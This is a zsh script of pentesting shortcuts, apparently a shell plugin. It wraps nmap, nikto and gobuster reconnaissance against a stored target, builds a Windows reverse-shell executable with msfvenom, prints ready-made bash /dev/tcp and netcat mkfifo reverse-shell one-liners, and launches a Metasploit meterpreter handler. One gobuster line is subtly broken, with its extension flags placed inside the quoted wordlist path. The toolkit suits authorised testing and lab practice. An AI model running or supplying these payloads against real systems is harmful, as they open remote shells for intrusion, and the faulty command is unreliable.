#!/usr/bin/env zsh

#-------------------------------------------------------------------------------------------
# Functions
#-------------------------------------------------------------------------------------------
# Directory creation function
#-------------------------------------------------------------------------------------------
create() {
    mkdir -p "$PWD"/{recon,data,exploits}
}
#-------------------------------------------------------------------------------------------
# Scanning functions
#-------------------------------------------------------------------------------------------

scan() {
    if [ -f "$HOME/.config/zsh-pentester/pentester.config" ]; then
        source "$HOME/.config/zsh-pentester/pentester.config"
        if [[ "${RHOST:-"EMPTY"}" != "EMPTY" ]]; then
            nmap -sCV --min-rate=5000 "${RHOST}" -Pn -vvv -oN fullscan_report
            nikto -h "${RHOST}" -o nikto_report.txt
        else
            echo "Target IP not set. Please use 'settarget' to set it first."
        fi
    else
        echo "Configuration file not found."
    fi
}
#-------------------------------------------------------------------------------------------
# Web-related functions
#-------------------------------------------------------------------------------------------
fuzz() {
    if [ -f "$HOME/.config/zsh-pentester/pentester.config" ]; then
        source "$HOME/.config/zsh-pentester/pentester.config"
        if [[ -n "$URL" ]]; then
            echo "Fuzzing with Gobuster URL: $URL"
            gobuster dir -u "$URL" -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
            gobuster dir -u "$URL" -w "/usr/share/seclists/Discovery/Web-Content/raft-large-extensions.txt -x html,php,txt,js,json,xml"
        else
            echo "URL is not set in the configuration file."
        fi
    else
        echo "Configuration file not found."
    fi
}
#-------------------------------------------------------------------------------------------
fuzzv() {
    if [ -f "$HOME/.config/zsh-pentester/pentester.config" ]; then
        source "$HOME/.config/zsh-pentester/pentester.config"
        if [[ -n "$URL" ]]; then
            echo "Scanning URL: $URL"
            gobuster vhost --append-domain -u "$URL" -w "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"
        else
            echo "URL is not set in the configuration file."
        fi
    else
        echo "Configuration file not found."
    fi
}
#-------------------------------------------------------------------------------------------
# URL functions
#-------------------------------------------------------------------------------------------
seturl() {
    local URL="$1"
    if [ -f "$HOME/.config/zsh-pentester/pentester.config" ]; then
        sed -i "/^URL=/c\URL=\"$URL\"" "$HOME/.config/zsh-pentester/pentester.config"
    else
        echo "URL=\"$URL\"" > "$HOME/.config/zsh-pentester/pentester.config"
    fi
    echo "URL TARGET: ${URL:-"NOT SET"}"
}
#-------------------------------------------------------------------------------------------
settarget() {
    local RHOST="$1"
    if [ -f "$HOME/.config/zsh-pentester/pentester.config" ]; then
        sed -i "/^RHOST=/c\RHOST=\"$RHOST\"" "$HOME/.config/zsh-pentester/pentester.config"
    else
        echo "RHOST=\"$RHOST\"" > "$HOME/.config/zsh-pentester/pentester.config"
    fi
    echo "RHOST: ${RHOST:-"NOT SET"}"
}
#-------------------------------------------------------------------------------------------
url() {
    local config_file="$HOME/.config/zsh-pentester/pentester.config"
    if [ -f "$config_file" ]; then
        # Lee la URL desde el archivo de configuración
        local URL=$(grep '^URL=' "$config_file" | cut -d'"' -f2)
        if [ -n "$URL" ]; then
            echo "URL TARGET: $URL"
        else
            echo "URL: NOT SET"
        fi
    else
        echo "Configuration file not found."
    fi
}
#-------------------------------------------------------------------------------------------
target() {
    local config_file="$HOME/.config/zsh-pentester/pentester.config"
    if [ -f "$config_file" ]; then
        # Lee la IP objetivo desde el archivo de configuración
        local RHOST=$(grep '^RHOST=' "$config_file" | cut -d'"' -f2)
        if [ -n "$RHOST" ]; then
            echo "IP TARGET: $RHOST"
        else
            echo "IP TARGET: NOT SET"
        fi
    else
        echo "Configuration file not found."
    fi
}
#-------------------------------------------------------------------------------------------
# Auxiliary functions
#-------------------------------------------------------------------------------------------
myip() {
    if [ -z "$1" ]; then
        echo -n "Enter the interface name (e.g., wlan0, eth0, tun0): "
        read INTERFACE
    else
        INTERFACE="$1"
    fi

    ifconfig "$INTERFACE" | grep "inet " | awk '{print $2}' | cut -d ":" -f2
}
#-------------------------------------------------------------------------------------------
shellw() {
    echo -n "Enter the interface name (e.g., wlan0, eth0, tun0): "
    read INTERFACE
    IP=$(ifconfig "$INTERFACE" | grep "inet " | awk '{print $2}')
    if [[ -n "$IP" ]]; then
        msfvenom -p windows/x64/shell_reverse_tcp LHOST="$IP" LPORT=4444 -a x64 -f exe -o shell.exe
        echo "[+] Payload has been created [+] IP: $IP Start listener on port:4444[+]"
    else
        echo "Unable to retrieve the IP address for interface $INTERFACE."
    fi
}
#-------------------------------------------------------------------------------------------
rshell() {
    echo -n "Enter the interface name (e.g., wlan0, eth0, tun0): "
    read INTERFACE
    IP=$(ifconfig "$INTERFACE" | grep "inet " | awk '{print $2}')
    if [[ -n "$IP" ]]; then 
        echo "bash -c 'exec bash -i &>/dev/tcp/$IP/4444 <&1'"
        echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP 4444 >/tmp/f"
    else
        echo "Unable to retrieve the IP address for interface $INTERFACE."
    fi
}
#-------------------------------------------------------------------------------------------
handler() {
    LPORT=4444
    echo -n "Enter the interface name (e.g., wlan0, eth0, tun0): "
    read INTERFACE
    IP=$(ifconfig "$INTERFACE" | grep "inet " | awk '{print $2}')
    if [[ -n "$IP" ]]; then
        msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $LPORT; exploit"
    else
        echo "Unable to retrieve the IP address for interface $INTERFACE."
    fi
}
#-------------------------------------------------------------------------------------------
server() {
    PORT=${1:-80}
    DIR=${2:-$(pwd)}
    echo "Serving files from $DIR"
    if type python3 >/dev/null 2>&1; then
       python3 -m http.server "$PORT"
    else
       python -m SimpleHTTPServer "$PORT" 
    fi
}
#-------------------------------------------------------------------------------------------
phelp() {
    echo "--------------------------------------------------------------------------"
    echo "[+] Available functions:"
    echo "--------------------------------------------------------------------------"
    echo "[+] Web-related functions:"
    echo "    [+] fuzz - Fuzzes with Gobuster on the specified URL"
    echo "    [+] fuzzv - Fuzzes vhosts with Gobuster on the specified URL"
    echo "    [+] url - Displays the current URL set for fuzzing or scanning"
    echo "    [+] seturl - Sets the URL for fuzzing or scanning"
    echo "--------------------------------------------------------------------------"
    echo "[+] Scanning functions:"
    echo "    [+] scan - Scans with nmap on the specified target"
    echo "    [+] settarget - Sets the target IP address for scanning"
    echo "    [+] target - Displays the current target IP address set for scanning"
    echo "--------------------------------------------------------------------------"
    echo "[+] Auxiliary functions:"
    echo "    [+] create - Creates directories nmap, data, exploits on current directory"
    echo "    [+] myip - Displays your IP address of a specified network interface"
    echo "    [+] shellw - Generates a windows/x64/shell_reverse_tcp payload"
    echo "    [+] rshell - Gives you bash & netcat shells with your IP"
    echo "    [+] handler - Set up a Metasploit handler"
    echo "    [+] server - Start a web server in the specified directory"
    echo "--------------------------------------------------------------------------"
}
#-------------------------------------------------------------------------------------------
